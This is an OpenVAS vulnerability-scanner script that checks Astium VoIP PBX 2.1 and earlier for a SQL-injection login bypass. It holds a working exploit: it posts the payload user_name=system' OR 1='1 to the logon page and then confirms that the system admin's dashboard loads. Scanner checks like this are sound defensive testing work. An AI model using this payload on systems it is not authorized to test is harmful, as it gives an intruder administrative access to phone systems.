###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_astium_voip_pbx_51273.nasl 11 2013-10-27 10:12:02Z jan $
#
# Astium VoIP PBX SQL Injection Vulnerability
#
# Authors:
# Michael Meyer <michael.meyer@greenbone.net>
#
# Copyright:
# Copyright (c) 2013 Greenbone Networks GmbH
#
# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License
# as published by the Free Software Foundation; either version 2
# of the License, or (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

include("revisions-lib.inc");
tag_summary = "Astium VoIP PBX is prone to an SQL-injection vulnerability because the
application fails to properly sanitize user-supplied input before
using it in an SQL query.

A successful exploit could allow an attacker to compromise the
application, access or modify data, or exploit vulnerabilities in the
underlying database.

Astium VoIP PBX <= v2.1 build 25399 is vulnerable; other versions may also be affected.";


SCRIPT_OID  = "1.3.6.1.4.1.25623.1.0.103631";

if (description)
{
 script_oid(SCRIPT_OID);
 script_version ("$Revision: 11 $");
 script_tag(name:"cvss_base", value:"10.0");
 script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:C/I:C/A:C");

 script_name("Astium VoIP PBX SQL Injection Vulnerability");

desc = "
 Summary:
 " + tag_summary;

 script_xref(name : "URL" , value : "http://www.exploit-db.com/exploits/23831/");

 script_tag(name:"risk_factor", value:"Critical");
 script_tag(name:"last_modification", value:"$Date: 2013-10-27 11:12:02 +0100 (So, 27. Okt 2013) $");
 script_tag(name:"creation_date", value:"2013-01-02 15:53:02 +0100 (Wed, 02 Jan 2013)");
 script_description(desc);
 script_summary("Determine if it is possible to login using sql injection");
 script_category(ACT_ATTACK);
 script_family("Web application abuses");
 script_copyright("This script is Copyright (C) 2013 Greenbone Networks GmbH");
 script_dependencies("find_service.nasl", "http_version.nasl");
 script_require_ports("Services/www", 80);
 script_exclude_keys("Settings/disable_cgi_scanning");
 if (revcomp(a: OPENVAS_VERSION, b: "6.0+beta5") >= 0) {
   script_tag(name : "summary" , value : tag_summary);
 }
 exit(0);
}

include("http_func.inc");
include("host_details.inc");
include("http_keepalive.inc");
include("global_settings.inc");
   
port = get_http_port(default:80);
if(!get_port_state(port))exit(0);

if(!can_host_php(port:port))exit(0);

url = '/index.php?js=0ctest=1&test=1&ctest=1';
host = get_host_name();

req = http_get(item:url, port:port);
buf = http_keepalive_send_recv(port:port, data:req, bodyonly:FALSE);

if(buf !~ "HTTP/1.. 302" || "Location" >!< buf || "astiumnls" >!< buf) exit(0);

astiumnls = eregmatch(pattern:"Location:.*index.php\?astiumnls=([a-z0-9]+)", string:buf);
if(isnull(astiumnls[1]))exit(0);

ex = "astiumnls=" + astiumnls[1] + "&__act=submit&user_name=system%27+OR+1%3D%271&pass_word=openvasa&submit=Login";
len = strlen(ex);

req = string("POST /en/logon.php HTTP/1.1\r\n",
             "Host: ", host,"\r\n",
             "Connection: Close\r\n",
             "Referer: http://",host,url,"\r\n",
             "Cookie: testcookie=test; astiumnls=",astiumnls[1],"; mypanel=up\r\n",
             "Content-Type: application/x-www-form-urlencoded\r\n",
             "Content-Length: ",len,"\r\n",
             "\r\n",
             ex);

buf = http_send_recv(port:port, data:req, bodyonly:FALSE);

if(buf !~ "HTTP/1.. 302" || "Location" >!< buf || "dashboard.php" >!< buf) exit(0);

req = string("GET /en/database/dashboard.php HTTP/1.1\r\n",
             "Host:",host,"\r\n",
             "Connection: Close\r\n",
             "Cookie: testcookie=test; astiumnls=",astiumnls[1],"; mypanel=up\r\n\r\n");

buf = http_send_recv(port:port, data:req, bodyonly:FALSE);

if("system admin's Dashboard" >< buf) {

  security_hole(port:port);
  exit(0);

}  

exit(0);
